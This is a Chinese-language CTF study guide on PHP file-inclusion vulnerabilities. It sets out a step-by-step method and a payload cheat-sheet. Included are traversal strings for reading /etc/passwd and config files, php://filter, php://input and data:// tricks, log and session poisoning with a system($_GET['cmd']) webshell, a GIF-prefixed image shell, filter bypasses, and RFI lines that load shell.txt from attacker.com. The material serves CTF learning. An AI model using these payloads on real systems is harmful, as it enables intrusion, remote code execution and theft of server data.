---
title: "CTF 文件包含题思路"
description: "整理本地与远程文件包含、伪协议读取及常见利用方向。"
order: 8
---

# CTF 文件包含题思路

------

## 0. 先建立总思路

文件包含题的本质是：

**程序把用户可控的参数当成文件路径，然后用 `include / require / fopen / readfile` 等函数去加载或读取。**

常见形式：

```php
include($_GET['file']);
require($_GET['page']);
include_once($_GET['lang']);
highlight_file($_GET['source']);
readfile($_GET['path']);
```

文件包含题一般分成四类：

### 第一类：本地文件包含 LFI

只能包含服务器本地文件。

例如：

```text
?file=../../../../etc/passwd
?page=./flag.php
```

### 第二类：远程文件包含 RFI

可以包含远程 URL。

例如：

```text
?file=http://attacker.com/shell.txt
```

但 RFI 通常需要 PHP 配置开启：

```ini
allow_url_include=On
allow_url_fopen=On
```

### 第三类：伪协议读取源码

利用 PHP 伪协议读取文件源码或做编码绕过。

例如：

```text
php://filter/read=convert.base64-encode/resource=index.php
```

### 第四类：文件包含联动 RCE

单独包含点不能直接命令执行，但可以配合：

- 日志文件
- Session 文件
- 上传文件
- 临时文件
- `/proc/self/environ`
- PHP 伪协议

最终让被包含文件里出现可执行 PHP 代码。

所以做题时不要一上来就只试 `../../flag`，而是要先判断：

**这是读文件题，还是执行代码题。**

------

## 1. 第一步：信息收集

先看页面和源码，不要急着上 payload。

重点看 URL 参数：

```text
?file=
?page=
?path=
?url=
?lang=
?template=
?view=
?module=
?include=
?document=
?load=
```

还要看：

- 页面源码
- 注释信息
- 报错信息
- 路由结构
- 目录结构
- 是否有下载、预览、切换语言、模板渲染功能
- 是否存在上传点
- 是否有登录功能
- 是否有日志、User-Agent、Cookie 回显

### 需要关注的核心信息

- 参数名是什么
- 参数是否能控制路径
- 是否自动拼接前缀
- 是否自动拼接后缀
- 是否过滤 `../`
- 是否过滤协议名
- 是否有报错回显
- 是否能读源码
- 是否能执行 PHP 代码

这一阶段目标不是立刻拿 flag，而是先搞清楚：

**包含函数到底在怎么拼路径。**

------

## 2. 第二步：先做最小测试

不要一开始就扔一大串 payload。

先用正常文件测试：

```text
?page=index
?page=home
?page=about
?page=flag
```

观察页面变化：

- 是否正常加载
- 是否报错
- 是否显示文件不存在
- 是否显示路径
- 是否提示后缀
- 是否出现 include / require 报错

如果有报错，重点看：

```text
include(): Failed opening 'xxx.php'
require(): failed to open stream
No such file or directory
```

这些报错经常能泄露真实拼接方式。

例如访问：

```text
?page=test
```

报错：

```text
include(pages/test.php): failed to open stream
```

说明后端可能是：

```php
include("pages/".$_GET['page'].".php");
```

这就非常关键。

------

## 3. 第三步：判断是“读取”还是“执行”

文件包含有两种效果：

### 1. 读取文件内容

例如：

```php
readfile($_GET['file']);
highlight_file($_GET['file']);
file_get_contents($_GET['file']);
```

这类通常用于读源码、读 flag。

### 2. 执行 PHP 代码

例如：

```php
include($_GET['file']);
require($_GET['file']);
```

如果被包含文件里有 PHP 代码，就可能执行。

### 判断方法

可以尝试包含一个普通文本文件，看它是：

- 原样输出
- 被当作 PHP 文件执行
- 没有任何显示
- 报错

如果能包含上传文件或日志文件，并执行其中的 PHP 代码，就可能走 RCE 路线。

------

## 4. 第四步：测试目录穿越

最基础的 LFI 测试：

```text
?file=../../../../etc/passwd
?file=../../../../../../etc/passwd
?file=..%2f..%2f..%2f..%2fetc%2fpasswd
?file=....//....//....//etc/passwd
```

Windows 环境可以测：

```text
?file=../../../../windows/win.ini
?file=../../../../boot.ini
?file=../../../../xampp/apache/conf/httpd.conf
```

Linux 常见可读文件：

```text
/etc/passwd
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/self/root/etc/passwd
```

### 重点判断

- `../` 是否被过滤
- URL 编码是否有效
- 双写是否有效
- 是否限制目录
- 是否有 open_basedir
- 是否自动补后缀

------

## 5. 第五步：判断是否自动拼接后缀

很多题会这样写：

```php
include($_GET['file'].'.php');
```

这时你传：

```text
?file=flag
```

实际包含的是：

```text
flag.php
```

如果你传：

```text
?file=../../../../etc/passwd
```

实际会变成：

```text
../../../../etc/passwd.php
```

自然读不到。

### 判断方法

随便传一个不存在的值：

```text
?file=aaa
```

如果报错里出现：

```text
aaa.php
pages/aaa.php
```

说明有后缀拼接。

### 常见绕过思路

老版本 PHP 可以考虑：

```text
%00 截断
```

例如：

```text
?file=../../../../etc/passwd%00
```

但 `%00` 主要适用于老 PHP，现代环境一般不可用。

还可以尝试路径长度截断，但现在也比较少见：

```text
?file=../../../../etc/passwd/././././././././././././././.
```

如果后缀无法绕过，就优先读 `.php` 文件源码，或者用伪协议。

------

## 6. 第六步：PHP 伪协议读取源码

文件包含题最常见考点之一就是 `php://filter`。

### 读取 PHP 源码

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
```

如果后端会自动拼接 `.php`：

```php
include($_GET['file'].'.php');
```

那么可以传：

```text
?file=php://filter/read=convert.base64-encode/resource=index
```

实际读取：

```text
index.php
```

拿到 base64 后解码即可看到源码。

### 常读文件

```text
index.php
flag.php
config.php
db.php
class.php
function.php
upload.php
admin.php
```

### 实战思路

先读 `index.php`，看代码逻辑；
再读配置文件，找数据库账号、flag 路径、过滤规则；
最后根据源码决定继续读文件还是转 RCE。

------

## 7. 第七步：常见 PHP 伪协议

### php://filter

主要用于读源码。

```text
php://filter/read=convert.base64-encode/resource=index.php
```

也可以组合过滤器：

```text
php://filter/convert.base64-encode/resource=index.php
```

### php://input

可以把 POST 请求体当作文件内容包含。

前提通常是：

- 使用 `include` / `require`
- `allow_url_include=On`
- 没有禁用相关用法

请求：

```text
POST /?file=php://input HTTP/1.1

<?php system($_GET['cmd']); ?>
```

然后：

```text
?file=php://input&cmd=id
```

### data://

直接把代码写进 URL。

前提通常也是需要 `allow_url_include=On`。

```text
?file=data://text/plain,<?php phpinfo();?>
```

base64 形式：

```text
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

### zip://

包含压缩包里的文件。

```text
?file=zip://shell.zip%23shell.php
```

其中 `%23` 是 `#` 的 URL 编码。

### phar://

可以读取或触发 phar 文件相关逻辑。

```text
?file=phar://shell.phar/test.txt
```

有些反序列化题会和 `phar://` 联动。

### file://

读取本地文件。

```text
?file=file:///etc/passwd
```

------

## 8. 第八步：日志包含

如果不能上传文件，但能控制请求头，可以考虑日志包含。

常见日志路径：

### Apache

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
```

### Nginx

```text
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### PHP-FPM

```text
/var/log/php-fpm/www-error.log
/var/log/php_errors.log
```

### 利用思路

先把 PHP 代码写进 User-Agent：

```text
User-Agent: <?php system($_GET['cmd']); ?>
```

访问一次后，日志里就可能出现这段内容。

然后包含日志文件：

```text
?file=/var/log/apache2/access.log&cmd=id
```

如果日志可读且 PHP 代码被 include 执行，就能 RCE。

### 注意点

- 日志路径不一定默认
- 日志文件可能没有权限读
- PHP 代码可能被转义
- 日志内容太大可能导致页面卡死
- 有些 WAF 会拦截 `<?php`

可以尝试短标签：

```php
<?=`id`?>
```

但是否可用取决于环境配置。

------

## 9. 第九步：Session 文件包含

如果网站使用 PHP Session，可以尝试控制 Session 内容，然后包含 Session 文件。

常见 Session 路径：

```text
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php/session/sess_PHPSESSID
/tmp/sess_PHPSESSID
```

其中 `PHPSESSID` 来自 Cookie。

例如 Cookie：

```text
Cookie: PHPSESSID=abc123
```

可能对应文件：

```text
/var/lib/php/sessions/sess_abc123
```

### 利用思路

如果某个参数会被写入 Session，例如用户名、验证码、语言、偏好设置：

```text
name=<?php system($_GET['cmd']); ?>
```

然后包含：

```text
?file=/var/lib/php/sessions/sess_abc123&cmd=id
```

### 判断重点

- 是否有 Session
- Cookie 中是否有 PHPSESSID
- 是否能控制 Session 内容
- Session 文件路径是否可读
- 包含后 PHP 代码是否执行

------

## 10. 第十步：上传文件包含联动

如果存在上传点，但上传后的文件不能直接执行，就要想到：

**上传图片马 + 文件包含触发执行。**

上传内容：

```php
GIF89a<?php system($_GET['cmd']); ?>
```

上传后得到路径：

```text
/upload/abc.jpg
```

然后包含：

```text
?file=upload/abc.jpg&cmd=id
```

如果 `include` 包含这个 jpg，里面的 PHP 代码会被执行。

这类题的关键不是让 `.jpg` 被 Web 服务器解析，而是让 PHP 的 `include` 去加载它。

### 注意点

- 上传文件是否原样保存
- 是否被图片重渲染
- 文件路径是否可控
- 包含点是否能包含上传目录
- 是否有后缀限制
- 是否有路径过滤

------

## 11. 第十一步：/proc 相关包含

Linux 下可以尝试 `/proc`。

### /proc/self/environ

有时可以读取环境变量，也可能包含 User-Agent。

```text
?file=/proc/self/environ
```

配合请求头写入：

```text
User-Agent: <?php system($_GET['cmd']); ?>
```

再包含：

```text
?file=/proc/self/environ&cmd=id
```

不过现代环境成功率不高。

### /proc/self/cmdline

查看启动命令：

```text
?file=/proc/self/cmdline
```

### /proc/self/cwd

当前工作目录：

```text
?file=/proc/self/cwd/index.php
```

### /proc/self/root

绕一些路径限制时可以尝试：

```text
?file=/proc/self/root/etc/passwd
```

------

## 12. 第十二步：filter 绕过技巧

如果过滤了关键字，要分析过滤方式。

### 过滤 ../

可以尝试：

```text
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
```

### 过滤 php://

可以尝试大小写或编码：

```text
Php://filter/read=convert.base64-encode/resource=index.php
php:%2f%2ffilter/read=convert.base64-encode/resource=index.php
```

是否有效取决于后端过滤和解析方式。

### 过滤 flag

可以先读源码，找真实文件名。

也可以尝试：

```text
fl%61g.php
fla?.php
/var/www/html/flag.php
```

如果是代码层面的字符串过滤，编码不一定有效；如果是路径匹配，有时通配或路径绕过有用。

### 过滤 base64

可以尝试其他 filter 链：

```text
php://filter/read=string.rot13/resource=index.php
php://filter/read=convert.quoted-printable-encode/resource=index.php
```

但实际最常用的还是 base64。

------

## 13. 第十三步：open_basedir 和权限问题

如果出现：

```text
open_basedir restriction in effect
Permission denied
failed to open stream
```

说明不是 payload 一定错了，而是路径或权限受限。

### open_basedir 表示什么

PHP 被限制在某些目录内，只能访问允许目录。

这时优先读：

```text
当前网站目录
/tmp
上传目录
Session 目录
```

### 权限不足怎么办

如果 `/etc/passwd` 读不到，不代表不能利用。

可以继续尝试：

```text
index.php
config.php
flag.php
../flag.php
../../flag.php
/tmp/sess_xxx
上传目录里的文件
```

很多 CTF 的 flag 不在系统敏感路径，而在 Web 目录附近。

------

## 14. 第十四步：Windows 环境思路

如果是 Windows / IIS / PHPStudy / XAMPP 环境，可以测：

```text
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/xampp/apache/conf/httpd.conf
C:/phpstudy_pro/Extensions/php/php.ini
C:/inetpub/wwwroot/index.php
```

目录穿越也可以用：

```text
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

如果是 PHP 环境，`php://filter` 通常仍然值得测试。

------

## 15. 第十五步：RFI 远程文件包含

远程文件包含现在比较少见，但遇到老环境要测。

测试：

```text
?file=http://example.com/test.txt
?file=https://example.com/test.txt
```

如果页面能加载远程内容，说明可能存在 RFI。

利用时远程文件内容可以是：

```php
<?php system($_GET['cmd']); ?>
```

然后：

```text
?file=http://attacker.com/shell.txt&cmd=id
```

### 注意点

RFI 通常需要：

```ini
allow_url_include=On
```

而且很多比赛环境不出网，所以即使代码允许，容器也可能访问不了公网。

可以考虑内网地址、本机服务、或者 data/php/input 等替代方案。

------

## 16. 第十六步：拿源码后的分析顺序

文件包含题一旦能读源码，优先读这些：

```text
index.php
config.php
flag.php
function.php
class.php
common.php
route.php
upload.php
admin.php
```

分析源码时重点看：

- include 的真实参数
- 过滤函数
- 黑名单还是白名单
- 是否拼接目录
- 是否拼接后缀
- flag 文件名
- 上传目录
- Session 写入点
- 日志路径提示
- 反序列化入口
- 文件读取函数

不要只读一个 `index.php` 就停。

很多题真正关键在 `config.php`、`function.php` 或 `flag.php`。

------

## 17. 第十七步：常见误区

### 误区一：只会测 /etc/passwd

`/etc/passwd` 只是判断 LFI 的测试文件，不是最终目标。

读不到它不代表题没洞。

### 误区二：看到 include 就只想 RCE

有些题只是让你读源码和 flag，不需要命令执行。

### 误区三：忽略自动拼接后缀

很多 payload 失败，是因为后端实际包含的是：

```text
payload.php
```

### 误区四：不会用 php://filter

只要是 PHP 文件包含，`php://filter` 几乎必测。

### 误区五：上传图片马后直接访问 jpg

如果服务器不解析 jpg，直接访问当然没用。

正确做法是通过包含点去 include 这个 jpg。

### 误区六：payload 太复杂

先用最小 payload 判断行为，再逐步加复杂度。

------

## 18. 最后的实战流程清单

以后做文件包含题，可以直接按下面顺序：

### 第一步：找参数

重点看：

```text
file / page / path / lang / template / view / module
```

### 第二步：看报错

用不存在文件测试，判断是否有路径、目录、后缀泄露。

### 第三步：测目录穿越

先测：

```text
../../../../etc/passwd
```

Windows 测：

```text
../../../../windows/win.ini
```

### 第四步：判断是否拼接后缀

看报错是否出现 `.php`、固定目录或固定模板路径。

### 第五步：测 php://filter

优先读源码：

```text
php://filter/read=convert.base64-encode/resource=index.php
```

### 第六步：读关键源码

读：

```text
index.php / config.php / flag.php / function.php / upload.php
```

### 第七步：判断目标

如果 flag 明文在文件里，直接读。

如果需要代码执行，再考虑 RCE。

### 第八步：测 php://input 和 data://

适用于可能开启 `allow_url_include` 的情况。

### 第九步：测日志包含

控制 User-Agent，把 PHP 代码写入日志，再 include 日志。

### 第十步：测 Session 包含

控制 Session 内容，再 include `sess_PHPSESSID`。

### 第十一步：测上传联动

上传图片马，再通过文件包含触发执行。

### 第十二步：处理过滤

根据过滤点尝试编码、双写、大小写、路径变形。

### 第十三步：拿到执行后稳步扩展

先：

```php
<?php echo "OK123"; ?>
```

再：

```php
<?php phpinfo(); ?>
```

最后：

```php
<?php system($_GET['cmd']); ?>
```

------

## 19. 常用 payload 速查

### 读源码

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
```

### 读 Linux 文件

```text
?file=../../../../etc/passwd
```

### 读 Windows 文件

```text
?file=../../../../windows/win.ini
```

### php://input

```text
?file=php://input
```

POST body：

```php
<?php system($_GET['cmd']); ?>
```

### data://

```text
?file=data://text/plain,<?php phpinfo();?>
```

### 日志包含

```text
User-Agent: <?php system($_GET['cmd']); ?>
```

```text
?file=/var/log/apache2/access.log&cmd=id
```

### Session 包含

```text
?file=/var/lib/php/sessions/sess_你的PHPSESSID&cmd=id
```

### 上传联动

上传：

```php
GIF89a<?php system($_GET['cmd']); ?>
```

包含：

```text
?file=upload/shell.jpg&cmd=id
```

------

## 20. 一句话版通杀口诀

**先找参数，再看报错；先测穿越，再判后缀；读源码用 filter，想 RCE 找日志、Session、上传联动。**

------
